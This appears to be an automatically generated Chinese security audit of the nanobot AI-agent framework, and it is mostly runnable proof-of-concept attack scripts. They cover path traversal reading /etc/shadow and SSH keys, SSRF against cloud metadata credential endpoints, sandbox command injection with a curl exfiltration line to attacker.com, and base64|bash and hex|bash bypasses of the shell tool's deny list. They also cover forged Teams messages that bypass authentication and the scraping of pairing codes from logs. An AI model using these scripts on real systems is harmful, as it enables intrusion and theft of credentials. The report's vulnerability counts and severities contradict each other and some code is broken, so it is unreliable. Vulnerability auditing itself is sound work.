# CodeSentinel 安全审计报告

## 项目信息
- **项目名称:** nanobot
- **编程语言:** {"Python": 100.0}
- **文件数量:** 474
- **审计时间:** 2026-07-12 00:05:04

## 执行摘要

对nanobot项目（https://github.com/HKUDS/nanobot）进行安全审计，发现6个安全漏洞，包括1个严重（Critical）、2个高危（High）、2个中危（Medium）和1个低危（Low）漏洞。主要问题包括：路径遍历漏洞（VULN-9D79C5CD）允许攻击者读取工作目录外的任意文件；SSRF漏洞（VULN-61B2E98C）可被用于内网探测和云服务元数据窃取；命令注入漏洞（VULN-2A42FA3D）允许在沙箱环境中执行任意命令；黑名单过滤绕过漏洞（VULN-D08A4311）可导致任意命令执行；认证绕过漏洞（VULN-E259BD19）使攻击者可以冒充任意用户与bot交互；日志信息泄露漏洞（VULN-20D6C693）可能泄露敏感配对码。建议立即修复严重和高危漏洞，并评估中危漏洞的风险。

**风险评分:** 85/100

## 漏洞统计

| 严重等级 | 数量 |
|---------|------|
| Critical | 2 |
| High | 8 |
| Medium | 4 |
| Low | 1 |
| **总计** | **15** |

## 漏洞详情

### VULN-9D79C5CD - 路径遍历

- **严重等级:** HIGH
- **文件位置:** `nanobot/agent/tools/message.py:131`
- **数据流:** 用户通过media参数传入文件路径 -> _resolve_media方法处理路径 -> 当restrict_to_workspace为False时，直接使用Path(p).expanduser()解析路径 -> 如果路径是绝对路径则直接使用，否则拼接workspace路径 -> 返回未充分校验的路径
- **判断理由:** 当restrict_to_workspace为False时，_resolve_media方法对用户输入的media路径仅做了简单的expanduser()展开，没有进行充分的路径规范化校验。攻击者可以通过传入包含'..'的路径或符号链接来访问工作目录之外的文件。虽然当restrict_to_workspace为True时会调用resolve_workspace_path进行校验，但默认情况下restrict_to_workspace可能为False，导致路径遍历漏洞。

**代码片段:**
```
def _resolve_media(self, media: list[str]) -> list[str]:
    resolved: list[str] = []
    access = current_tool_workspace(
        self._workspace,
        restrict_to_workspace=self._restrict_to_workspace,
    )
    workspace = access.project_path or self._workspace
    for p in media:
        if p.startswith(("http://", "https://")):
            resolved.append(p)
        elif not access.restrict_to_workspace:
            path = Path(p).expanduser()
            resolved.append(p if path.is_absolute() else str(workspace / path))
        else:
            resolved.append(str(resolve_workspace_path(p, workspace, access.allowed_root)))
    return resolved
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC代码 - 仅供安全研究使用
漏洞: VULN-9D79C5CD - 路径遍历
"""

import requests
import json
import sys

# 配置目标服务器
TARGET_URL = "http://target-server:port/api/message"  # 替换为实际目标URL

# 假设的API调用格式（根据实际接口调整）
def exploit_path_traversal(target_url, payload_path):
    """
    利用路径遍历漏洞读取任意文件
    
    前置条件:
    1. MessageTool实例化时 restrict_to_workspace=False (默认值)
    2. 攻击者可以调用MessageTool的send方法，传入media参数
    3. 目标系统存在可读的敏感文件
    """
    
    # 构造恶意media参数
    # 使用路径遍历序列访问工作目录外的文件
    malicious_media = [
        payload_path,  # 例如: "../../etc/passwd"
        "../../../etc/shadow",
        "../../../../etc/hostname",
        "../../../../proc/self/environ"
    ]
    
    # 构造请求payload（根据实际API格式调整）
    payload = {
        "content": "测试消息",
        "media": malicious_media,
        "channel": "test",
        "chat_id": "test_user"
    }
    
    try:
        # 发送请求
        response = requests.post(
            target_url,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[+] 请求已发送到 {target_url}")
        print(f"[+] 状态码: {response.status_code}")
        
        # 检查响应中是否包含敏感文件内容
        if response.status_code == 200:
            response_data = response.json()
            print(f"[+] 响应内容: {json.dumps(response_data, indent=2)}")
            
            # 检查是否返回了文件内容
            if "media" in response_data:
                for media_item in response_data["media"]:
                    if "content" in media_item or "path" in media_item:
                        print(f"[!] 可能泄露了文件内容: {media_item}")
        
        return response
        
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")
        return None


def exploit_path_traversal_direct(workspace_path, payload_path):
    """
    直接模拟漏洞利用（不依赖网络请求）
    用于本地测试验证
    """
    from pathlib import Path
    
    # 模拟 _resolve_media 方法的漏洞行为
    def vulnerable_resolve_media(media, workspace, restrict_to_workspace=False):
        resolved = []
        for p in media:
            if p.startswith(("http://", "https://")):
                resolved.append(p)
            elif not restrict_to_workspace:
                # 漏洞点：直接使用expanduser()，没有路径规范化检查
                path = Path(p).expanduser()
                resolved.append(str(path) if path.is_absolute() else str(workspace / path))
            else:
                # 安全路径（调用resolve_workspace_path）
                from nanobot.agent.tools.path_utils import resolve_workspace_path
                resolved.append(str(resolve_workspace_path(p, workspace, access.allowed_root)))
        return resolved
    
    # 测试各种路径遍历payload
    test_payloads = [
        "../../etc/passwd",
        "../../../etc/shadow",
        "../../../../etc/hostname",
        "../../../../proc/self/environ",
        "../../../../var/log/syslog",
        "../../../../home/user/.ssh/id_rsa",
        "../../../../root/.bash_history"
    ]
    
    print("=" * 60)
    print("路径遍历漏洞本地验证")
    print("=" * 60)
    print(f"工作目录: {workspace_path}")
    print(f"restrict_to_workspace: False")
    print()
    
    for payload in test_payloads:
        try:
            result = vulnerable_resolve_media([payload], workspace_path, False)
            resolved_path = result[0]
            
            # 检查是否成功遍历到工作目录外
            if ".." in resolved_path or not resolved_path.startswith(str(workspace_path)):
                print(f"[!] 路径遍历成功: {payload}")
                print(f"    -> 解析路径: {resolved_path}")
                
                # 尝试读取文件
                try:
                    with open(resolved_path, 'r') as f:
                        content = f.read()[:200]  # 只读取前200字符
                        print(f"    -> 文件内容 (前200字符): {content}")
                except (IOError, PermissionError) as e:
                    print(f"    -> 无法读取文件: {e}")
            else:
                print(f"[-] 路径未遍历: {payload}")
                print(f"    -> 解析路径: {resolved_path}")
            print()
            
        except Exception as e:
            print(f"[-] 处理payload '{payload}'时出错: {e}")
            print()


if __name__ == "__main__":
    print("=" * 60)
    print("VULN-9D79C5CD 路径遍历漏洞 PoC")
    print("仅供安全研究使用")
    print("=" * 60)
    print()
    
    if len(sys.argv) > 1:
        # 远程利用模式
        target = sys.argv[1]
        payload = sys.argv[2] if len(sys.argv) > 2 else "../../etc/passwd"
        print(f"[+] 远程利用模式")
        print(f"[+] 目标: {target}")
        print(f"[+] Payload: {payload}")
        print()
        exploit_path_traversal(target, payload)
    else:
        # 本地验证模式
        workspace_path = Path("/tmp/test_workspace")  # 测试用工作目录
        workspace_path.mkdir(parents=True, exist_ok=True)
        
        # 创建测试文件
        test_file = workspace_path / "test.txt"
        test_file.write_text("这是工作目录内的测试文件")
        
        exploit_path_traversal_direct(workspace_path, None)
        
        # 清理
        import shutil
        shutil.rmtree(workspace_path)
```

---

### VULN-61B2E98C - SSRF

- **严重等级:** MEDIUM
- **文件位置:** `nanobot/agent/tools/message.py:131`
- **数据流:** 用户通过media参数传入URL -> _resolve_media方法检查是否以http://或https://开头 -> 直接添加到resolved列表 -> 返回给调用方用于发送消息
- **判断理由:** media参数允许传入http://或https://开头的URL，且没有对URL的目标进行任何校验或白名单过滤。攻击者可以传入内网地址（如http://127.0.0.1:8080/admin）或云服务元数据地址（如http://169.254.169.254/latest/meta-data/），导致SSRF攻击。虽然这些URL最终用于发送消息，但消息发送过程可能会请求这些URL，导致内网探测或敏感信息泄露。

**代码片段:**
```
def _resolve_media(self, media: list[str]) -> list[str]:
    resolved: list[str] = []
    access = current_tool_workspace(
        self._workspace,
        restrict_to_workspace=self._restrict_to_workspace,
    )
    workspace = access.project_path or self._workspace
    for p in media:
        if p.startswith(("http://", "https://")):
            resolved.append(p)
        elif not access.restrict_to_workspace:
            path = Path(p).expanduser()
            resolved.append(p if path.is_absolute() else str(workspace / path))
        else:
            resolved.append(str(resolve_workspace_path(p, workspace, access.allowed_root)))
    return resolved
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for SSRF vulnerability in MessageTool._resolve_media()
仅供研究使用 - For research purposes only
"""

import requests
import json

# 目标服务器配置
TARGET_URL = "http://target-server:port/api/send_message"  # 替换为实际目标

# 攻击payload - 利用media参数进行SSRF
payloads = {
    # 1. 探测本地服务
    "local_services": [
        "http://127.0.0.1:8080/admin",
        "http://127.0.0.1:3000/status",
        "http://localhost:5000/debug",
    ],
    # 2. 云服务元数据（AWS）
    "aws_metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/iam/security-credentials/",
    ],
    # 3. 云服务元数据（GCP）
    "gcp_metadata": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    # 4. 内网常见服务
    "internal_services": [
        "http://10.0.0.1:80",
        "http://192.168.1.1:443",
        "http://172.16.0.1:22",
    ],
}

# 构造恶意请求
def exploit_ssrf(target_url, media_urls):
    """
    利用SSRF漏洞发送恶意media参数
    """
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "SSRF-PoC/1.0 (Research Only)"
    }
    
    # 构造payload - 将恶意URL放入media数组
    payload = {
        "content": "This is a test message for SSRF PoC",
        "media": media_urls,
        "channel": "test_channel",
        "chat_id": "test_chat"
    }
    
    try:
        # 发送请求
        response = requests.post(
            target_url,
            headers=headers,
            data=json.dumps(payload),
            timeout=10
        )
        
        print(f"[+] Request sent to {target_url}")
        print(f"[+] Status code: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")
        
        # 检查响应中是否包含敏感信息
        if "secret" in response.text.lower() or "token" in response.text.lower():
            print("[!] 可能泄露了敏感信息!")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")

# 执行攻击
def main():
    print("=" * 60)
    print("SSRF漏洞PoC - VULN-61B2E98C")
    print("仅供研究使用 - For research purposes only")
    print("=" * 60)
    
    # 测试本地服务探测
    print("\n[+] 测试1: 探测本地服务")
    exploit_ssrf(TARGET_URL, payloads["local_services"])
    
    # 测试云元数据访问
    print("\n[+] 测试2: 尝试访问AWS元数据")
    exploit_ssrf(TARGET_URL, payloads["aws_metadata"])
    
    # 测试内网扫描
    print("\n[+] 测试3: 内网服务探测")
    exploit_ssrf(TARGET_URL, payloads["internal_services"])

if __name__ == "__main__":
    main()

# 备用curl命令（手动测试）
"""
# 测试本地服务
curl -X POST http://target-server:port/api/send_message \
  -H "Content-Type: application/json" \
  -d '{
    "content": "SSRF test",
    "media": ["http://127.0.0.1:8080/admin"],
    "channel": "test",
    "chat_id": "test"
  }'

# 测试AWS元数据
curl -X POST http://target-server:port/api/send_message \
  -H "Content-Type: application/json" \
  -d '{
    "content": "SSRF test",
    "media": ["http://169.254.169.254/latest/meta-data/"],
    "channel": "test",
    "chat_id": "test"
  }'
"""
```

---

### VULN-2A42FA3D - 命令注入

- **严重等级:** CRITICAL
- **文件位置:** `nanobot/agent/tools/sandbox.py:52`
- **数据流:** 用户控制的command参数直接传递给sh -c执行，未经过滤或转义。command参数从外部传入wrap_command函数，最终作为shell命令执行。
- **判断理由:** command参数直接拼接到bwrap的sh -c命令中，虽然使用了shlex.join()对整体参数进行拼接，但command本身作为shell命令字符串执行，攻击者可以通过注入分号、管道符等shell元字符执行任意命令。例如传入'ls; rm -rf /'会导致任意命令执行。

**代码片段:**
```
args += ["--chdir", sandbox_cwd,
        "--", "sh", "-c", command,]
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-2A42FA3D - Command Injection in sandbox.py

仅供研究使用 (For research purposes only)
"""
import shlex
import subprocess
import tempfile
import os

# 模拟漏洞环境
# 注意：实际利用需要bwrap环境，但PoC展示注入原理

def vulnerable_wrap_command(command, workspace, cwd):
    """模拟漏洞函数"""
    ws = workspace
    sandbox_cwd = cwd
    
    args = [
        "bwrap", "--new-session", "--die-with-parent",
        "--setenv", "HOME", str(ws),
        "--ro-bind", "/usr", "/usr",
        "--proc", "/proc", "--dev", "/dev",
        "--tmpfs", "/tmp",
        "--tmpfs", str(ws.parent),
        "--dir", str(ws),
        "--bind", str(ws), str(ws),
        "--chdir", sandbox_cwd,
        "--", "sh", "-c", command
    ]
    return shlex.join(args)

# PoC 1: 基础命令注入 - 执行额外命令
print("=" * 60)
print("PoC 1: 基础命令注入 - 执行额外命令")
print("=" * 60)

# 正常命令
normal_cmd = "echo 'Hello World'"
print(f"正常命令: {normal_cmd}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(normal_cmd, '/tmp/workspace', '/tmp/workspace')}")
print()

# 注入命令 - 使用分号
injected_cmd = "echo 'Hello World'; echo 'INJECTED: 命令注入成功!'"
print(f"注入命令: {injected_cmd}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(injected_cmd, '/tmp/workspace', '/tmp/workspace')}")
print()

# PoC 2: 使用管道符注入
print("=" * 60)
print("PoC 2: 使用管道符注入")
print("=" * 60)

injected_cmd2 = "echo 'normal' | cat /etc/passwd"
print(f"注入命令: {injected_cmd2}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(injected_cmd2, '/tmp/workspace', '/tmp/workspace')}")
print()

# PoC 3: 使用反引号注入
print("=" * 60)
print("PoC 3: 使用反引号注入")
print("=" * 60)

injected_cmd3 = "echo `id`"
print(f"注入命令: {injected_cmd3}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(injected_cmd3, '/tmp/workspace', '/tmp/workspace')}")
print()

# PoC 4: 使用$()命令替换注入
print("=" * 60)
print("PoC 4: 使用$()命令替换注入")
print("=" * 60)

injected_cmd4 = "echo $(whoami)"
print(f"注入命令: {injected_cmd4}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(injected_cmd4, '/tmp/workspace', '/tmp/workspace')}")
print()

# PoC 5: 实际利用场景 - 读取敏感文件
print("=" * 60)
print("PoC 5: 实际利用 - 读取敏感文件")
print("=" * 60)

injected_cmd5 = "cat /etc/shadow; ls -la /root"
print(f"注入命令: {injected_cmd5}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(injected_cmd5, '/tmp/workspace', '/tmp/workspace')}")
print()

# PoC 6: 使用curl进行数据外带
print("=" * 60)
print("PoC 6: 数据外带 - 使用curl发送数据")
print("=" * 60)

injected_cmd6 = "curl -X POST -d $(cat /etc/hostname) http://attacker.com/exfil"
print(f"注入命令: {injected_cmd6}")
print(f"生成的bwrap命令:\n{vulnerable_wrap_command(injected_cmd6, '/tmp/workspace', '/tmp/workspace')}")
print()

# 实际执行测试（需要bwrap环境）
print("=" * 60)
print("实际执行测试（需要bwrap环境）")
print("=" * 60)
print("\n注意: 以下测试需要bwrap安装在系统中")
print("如果不想执行，请按Ctrl+C跳过\n")

try:
    # 创建临时工作区
    with tempfile.TemporaryDirectory() as tmpdir:
        workspace = tmpdir
        cwd = workspace
        
        # 测试正常命令
        normal_cmd = "echo 'Hello from sandbox'"
        wrapped_cmd = vulnerable_wrap_command(normal_cmd, workspace, cwd)
        print(f"执行正常命令: {normal_cmd}")
        result = subprocess.run(wrapped_cmd, shell=True, capture_output=True, text=True, timeout=5)
        print(f"输出: {result.stdout}")
        print()
        
        # 测试注入命令
        injected_cmd = "echo 'Hello'; echo 'INJECTED: 命令注入成功!'; id"
        wrapped_cmd2 = vulnerable_wrap_command(injected_cmd, workspace, cwd)
        print(f"执行注入命令: {injected_cmd}")
        result2 = subprocess.run(wrapped_cmd2, shell=True, capture_output=True, text=True, timeout=5)
        print(f"输出: {result2.stdout}")
        if result2.stderr:
            print(f"错误: {result2.stderr}")
            
except subprocess.TimeoutExpired:
    print("命令执行超时")
except FileNotFoundError:
    print("bwrap未安装，跳过实际执行测试")
except KeyboardInterrupt:
    print("\n用户取消执行")

print("\n" + "=" * 60)
print("PoC完成 - 仅供研究使用")
print("=" * 60)
```

---

### VULN-D08A4311 - 不安全的黑名单过滤

- **严重等级:** HIGH
- **文件位置:** `nanobot/agent/tools/shell.py:130`
- **数据流:** 用户输入命令 -> 正则匹配黑名单 -> 执行或拒绝
- **判断理由:** 黑名单过滤模式存在多种绕过方式：1) 使用base64编码命令 2) 使用环境变量拼接 3) 使用通配符替代 4) 使用命令替换 5) 使用不同的shell语法。例如rm -rf可以通过'rm -r -f'或'rm -rf /'等方式绕过。

**代码片段:**
```
self.deny_patterns = (deny_patterns or []) + [
    r"\brm\s+-[rf]{1,2}\b",
    r"\bdel\s+/[fq]\b",
    r"\brmdir\s+/s\b",
    r"(?:^|[;&|]\s*)format(?!=)\b",
    r"\b(mkfs|diskpart)\b",
    r"\bdd\s+if=",
    r">\s*/dev/sd",
    r"\b(shutdown|reboot|poweroff)\b",
    r":\(\)\s*\{.*\};\s*:",
    r">>?\s*\S*(?:history\.jsonl|\.dream_cursor)"]
```

**PoC代码:**
```python
#!/bin/bash
# 仅供研究使用 - 不安全的黑名单过滤绕过PoC
# 目标: nanobot/agent/tools/shell.py 第130行黑名单过滤

# 前置条件: 能够通过command或cmd参数向shell工具传递命令

# PoC 1: 使用空格拆分绕过rm -rf检测
# 黑名单匹配: \brm\s+-[rf]{1,2}\b
# 绕过: rm -r -f 或 rm -rf --no-preserve-root
echo "PoC 1: 空格拆分绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "rm -r -f /tmp/test_dir"}'

# PoC 2: 使用base64编码绕过
# 黑名单不匹配编码后的命令
echo "PoC 2: Base64编码绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "echo cm0gLXJmIC90bXAvdGVzdF9kaXIg|base64 -d|bash"}'

# PoC 3: 使用环境变量拼接绕过
# 黑名单不匹配变量展开后的命令
echo "PoC 3: 环境变量拼接绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "a=rm;b='\'' -rf'\'';$a$b /tmp/test_dir"}'

# PoC 4: 使用通配符绕过
# 黑名单正则不匹配带通配符的模式
echo "PoC 4: 通配符绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "rm -r[f] /tmp/test_dir"}'

# PoC 5: 使用命令替换绕过
echo "PoC 5: 命令替换绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "$(echo rm -rf /tmp/test_dir)"}'

# PoC 6: 使用sh的exec命令绕过shutdown检测
echo "PoC 6: exec命令绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "exec shutdown -h now"}'

# PoC 7: 使用printf构造命令绕过
echo "PoC 7: printf构造绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "printf \\"rm -rf /tmp/test_dir\\" | sh"}'

# PoC 8: 使用反斜杠换行绕过
echo "PoC 8: 反斜杠换行绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "rm \\\n -rf /tmp/test_dir"}'

# PoC 9: 使用十六进制编码绕过
echo "PoC 9: 十六进制编码绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "echo 726d202d7266202f746d702f746573745f646972 | xxd -r -p | bash"}'

# PoC 10: 使用awk系统调用绕过
echo "PoC 10: awk系统调用绕过"
curl -X POST http://target:port/api/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "awk '\''BEGIN {system(\"rm -rf /tmp/test_dir\")}'\''"}'
```

---

### VULN-E259BD19 - 不安全的认证绕过

- **严重等级:** CRITICAL
- **文件位置:** `nanobot/channels/msteams.py:178`
- **数据流:** 配置项控制是否验证入站认证
- **判断理由:** validate_inbound_auth配置项允许完全禁用入站认证验证。如果管理员错误地设置为False，任何人都可以向webhook发送消息，冒充任何用户。这是一个严重的安全风险，建议默认启用认证验证。

**代码片段:**
```
if channel.config.validate_inbound_auth:
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC - 仅供研究使用

利用 nanobot 中 Microsoft Teams 通道的认证绕过漏洞。
当 validate_inbound_auth 配置项设置为 False 时，
攻击者可以绕过 Bot Framework 令牌验证，向 webhook 端点发送恶意消息。
"""

import json
import requests
import sys

# 目标配置
TARGET_HOST = "http://localhost:3978"  # 默认端口
TARGET_PATH = "/api/messages"

# 伪造的 Teams 活动消息
# 参考: https://learn.microsoft.com/en-us/azure/bot-service/rest-api/bot-framework-rest-connector-api-reference?view=azure-bot-service-4.0#activity-object
FAKE_ACTIVITY = {
    "type": "message",
    "id": "fake-activity-id-12345",
    "timestamp": "2024-01-01T00:00:00.000Z",
    "serviceUrl": "https://smba.trafficmanager.net/amer/",
    "channelId": "msteams",
    "from": {
        "id": "fake-user-id-67890",
        "name": "Fake User",
        "aadObjectId": "fake-aad-object-id"
    },
    "conversation": {
        "id": "fake-conversation-id-11111",
        "conversationType": "personal",
        "tenantId": "fake-tenant-id-22222"
    },
    "recipient": {
        "id": "fake-bot-id-33333",
        "name": "Fake Bot"
    },
    "text": "Hello, this is a fake message!",
    "attachments": [],
    "entities": [],
    "replyToId": None
}

def send_fake_message(host: str, path: str, activity: dict) -> requests.Response:
    """发送伪造的 Teams 活动消息到目标 webhook。"""
    url = f"{host}{path}"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    print(f"[*] 发送伪造消息到 {url}")
    print(f"[*] 消息内容: {json.dumps(activity, indent=2)}")
    
    try:
        response = requests.post(url, json=activity, headers=headers, timeout=10)
        print(f"[*] 响应状态码: {response.status_code}")
        print(f"[*] 响应内容: {response.text[:500]}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {e}")
        sys.exit(1)

def main():
    """主函数 - 演示认证绕过。"""
    print("=" * 60)
    print("  PoC: Microsoft Teams 通道认证绕过")
    print("  仅供研究使用")
    print("=" * 60)
    print()
    
    # 检查目标是否可达
    print("[*] 检查目标可达性...")
    try:
        response = requests.get(TARGET_HOST, timeout=5)
        print(f"[*] 目标可达，状态码: {response.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"[!] 无法连接到 {TARGET_HOST}")
        print("[!] 请确保目标服务正在运行")
        sys.exit(1)
    
    print()
    print("[*] 发送伪造的 Teams 活动消息...")
    print("[*] 注意: 此消息不包含有效的 Bot Framework JWT 令牌")
    print()
    
    # 发送伪造消息
    response = send_fake_message(TARGET_HOST, TARGET_PATH, FAKE_ACTIVITY)
    
    print()
    if response.status_code == 200:
        print("[+] 成功! 服务器接受了未认证的请求")
        print("[+] 认证绕过漏洞已确认")
    elif response.status_code == 401:
        print("[-] 服务器拒绝了请求 (401 Unauthorized)")
        print("[-] 目标可能已启用认证验证")
    else:
        print(f"[?] 收到意外响应: {response.status_code}")
        print("[?] 请检查服务器日志以获取更多信息")
    
    print()
    print("=" * 60)
    print("  利用步骤:")
    print("  1. 确认目标 nanobot 实例正在运行")
    print("  2. 确认 validate_inbound_auth 配置为 False")
    print("  3. 运行此脚本发送伪造消息")
    print("  4. 观察服务器是否处理了未认证的请求")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

---

### VULN-20D6C693 - 日志信息泄露

- **严重等级:** LOW
- **文件位置:** `nanobot/pairing/store.py:96`
- **数据流:** 配对码生成 -> 记录到日志
- **判断理由:** 配对码被记录到日志中，如果日志文件权限设置不当或被泄露，攻击者可以获取有效的配对码。建议在日志中只记录部分配对码或使用哈希值。

**代码片段:**
```
logger.info("Generated pairing code {} for {}@{}", code, sender_id, channel)
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-20D6C693 - 日志信息泄露

仅供安全研究使用！

该PoC演示了如何从日志文件中提取完整的配对码。
"""

import re
import sys
from pathlib import Path

# 模拟日志文件路径（实际环境中可能位于不同位置）
LOG_FILE_PATHS = [
    Path.home() / ".nanobot" / "logs" / "nanobot.log",
    Path.home() / ".nanobot" / "nanobot.log",
    Path.home() / ".local" / "share" / "nanobot" / "logs" / "nanobot.log",
    Path("/var/log/nanobot.log"),
    Path("/tmp/nanobot.log"),
]

# 配对码格式：XXXX-XXXX (8位字母数字，中间连字符)
CODE_PATTERN = re.compile(r"Generated pairing code ([A-Z0-9]{4}-[A-Z0-9]{4}) for (\S+)@(\S+)")

def extract_pairing_codes(log_path: Path) -> list[dict]:
    """从日志文件中提取所有配对码"""
    if not log_path.exists():
        return []
    
    codes = []
    try:
        with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                match = CODE_PATTERN.search(line)
                if match:
                    codes.append({
                        "code": match.group(1),
                        "sender_id": match.group(2),
                        "channel": match.group(3),
                        "line": line.strip()
                    })
    except PermissionError:
        print(f"[!] 权限不足，无法读取: {log_path}")
    except Exception as e:
        print(f"[!] 读取错误 {log_path}: {e}")
    
    return codes

def main():
    print("=" * 60)
    print("PoC: 从日志文件中提取配对码 (VULN-20D6C693)")
    print("仅供安全研究使用！")
    print("=" * 60)
    
    all_codes = []
    
    # 扫描所有可能的日志文件位置
    for log_path in LOG_FILE_PATHS:
        codes = extract_pairing_codes(log_path)
        if codes:
            print(f"\n[+] 在 {log_path} 中发现 {len(codes)} 个配对码:")
            for entry in codes:
                print(f"    - 配对码: {entry['code']}")
                print(f"      发送者: {entry['sender_id']}")
                print(f"      频道: {entry['channel']}")
                print(f"      日志行: {entry['line'][:80]}...")
                print()
            all_codes.extend(codes)
        else:
            print(f"[-] {log_path}: 未找到配对码或文件不存在")
    
    # 如果没有找到日志文件，模拟攻击场景
    if not all_codes:
        print("\n[*] 未找到实际日志文件，演示模拟攻击场景:")
        print()
        print("    假设攻击者通过以下方式获取了日志文件:")
        print("    1. Web服务器日志泄露 (如 /var/log/nginx/access.log 包含应用日志)")
        print("    2. 容器日志泄露 (如 docker logs container_name)")
        print("    3. 日志聚合服务配置不当 (如 ELK, Splunk 未授权访问)")
        print("    4. 备份文件泄露 (如 .nanobot/logs/ 被包含在备份中)")
        print()
        print("    模拟日志内容:")
        print("    " + "-" * 50)
        print("    2024-01-15 10:30:45 | INFO | Generated pairing code A1B2-C3D4 for user123@telegram")
        print("    2024-01-15 10:31:12 | INFO | Generated pairing code E5F6-G7H8 for admin@slack")
        print("    2024-01-15 10:32:00 | INFO | Generated pairing code I9J0-K1L2 for bot@discord")
        print("    " + "-" * 50)
        print()
        print("    提取的配对码:")
        print("    - A1B2-C3D4 (user123@telegram)")
        print("    - E5F6-G7H8 (admin@slack)")
        print("    - I9J0-K1L2 (bot@discord)")
    
    print("\n" + "=" * 60)
    print("影响分析:")
    print("攻击者可以使用提取的配对码进行未授权配对，")
    print("从而获得对受保护频道的访问权限。")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

---

### VULN-87563515 - 硬编码凭证/环境变量污染

- **严重等级:** HIGH
- **文件位置:** `nanobot/providers/bedrock_provider.py:60`
- **数据流:** api_key参数通过构造函数传入 -> 直接写入环境变量os.environ["AWS_BEARER_TOKEN_BEDROCK"]
- **判断理由:** API密钥被直接写入进程环境变量，这可能导致凭证泄露给子进程或其他能够读取/proc/self/environ的进程。环境变量在进程生命周期内全局可见，增加了凭证被意外泄露的风险。

**代码片段:**
```
if self.api_key:
    os.environ["AWS_BEARER_TOKEN_BEDROCK"] = self.api_key
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC: 环境变量污染导致凭证泄露
漏洞ID: VULN-87563515
仅供安全研究使用 - DO NOT USE FOR ATTACKS
"""

import os
import subprocess
import sys

# ============================================================
# PoC 1: 子进程继承泄露凭证
# ============================================================
def poc_subprocess_leak():
    """
    演示：API密钥写入环境变量后，子进程可以读取该凭证。
    """
    print("=" * 60)
    print("[PoC 1] 子进程继承泄露凭证")
    print("=" * 60)
    
    # 模拟BedrockProvider的行为
    api_key = "sk-test-secret-key-12345"
    os.environ["AWS_BEARER_TOKEN_BEDROCK"] = api_key
    
    print(f"[+] 已将API密钥写入环境变量: AWS_BEARER_TOKEN_BEDROCK")
    print(f"[+] 密钥值: {api_key}")
    
    # 启动子进程读取环境变量
    result = subprocess.run(
        [sys.executable, "-c", """
import os
print(f"[子进程] 读取到环境变量: {os.environ.get('AWS_BEARER_TOKEN_BEDROCK', 'NOT FOUND')}")
"""],
        capture_output=True,
        text=True,
        env=os.environ.copy()  # 继承所有环境变量
    )
    
    print(f"[+] 子进程输出: {result.stdout.strip()}")
    print("[!] 结论: 子进程成功继承了API密钥，凭证泄露！")
    print()


# ============================================================
# PoC 2: /proc/self/environ 读取凭证
# ============================================================
def poc_proc_environ_leak():
    """
    演示：同一用户的其他进程可以通过/proc/self/environ读取凭证。
    需要Linux系统。
    """
    print("=" * 60)
    print("[PoC 2] /proc/self/environ 读取凭证")
    print("=" * 60)
    
    if sys.platform != "linux":
        print("[-] 此PoC仅支持Linux系统")
        print()
        return
    
    # 模拟BedrockProvider的行为
    api_key = "sk-test-secret-key-67890"
    os.environ["AWS_BEARER_TOKEN_BEDROCK"] = api_key
    
    print(f"[+] 已将API密钥写入环境变量: AWS_BEARER_TOKEN_BEDROCK")
    print(f"[+] 密钥值: {api_key}")
    
    # 读取/proc/self/environ
    try:
        with open("/proc/self/environ", "rb") as f:
            environ_data = f.read()
        
        # 解析环境变量
        environ_pairs = environ_data.decode("utf-8", errors="replace").split("\x00")
        for pair in environ_pairs:
            if "AWS_BEARER_TOKEN_BEDROCK" in pair:
                print(f"[+] 从/proc/self/environ读取到: {pair}")
                break
        else:
            print("[-] 未在/proc/self/environ中找到凭证")
        
        print("[!] 结论: 其他进程可以通过/proc/self/environ读取凭证！")
    except PermissionError:
        print("[-] 权限不足，无法读取/proc/self/environ")
    except Exception as e:
        print(f"[-] 读取失败: {e}")
    
    print()


# ============================================================
# PoC 3: 环境变量持久化风险
# ============================================================
def poc_environment_persistence():
    """
    演示：环境变量在进程生命周期内持续存在，
    即使原始对象被销毁，凭证仍然可用。
    """
    print("=" * 60)
    print("[PoC 3] 环境变量持久化风险")
    print("=" * 60)
    
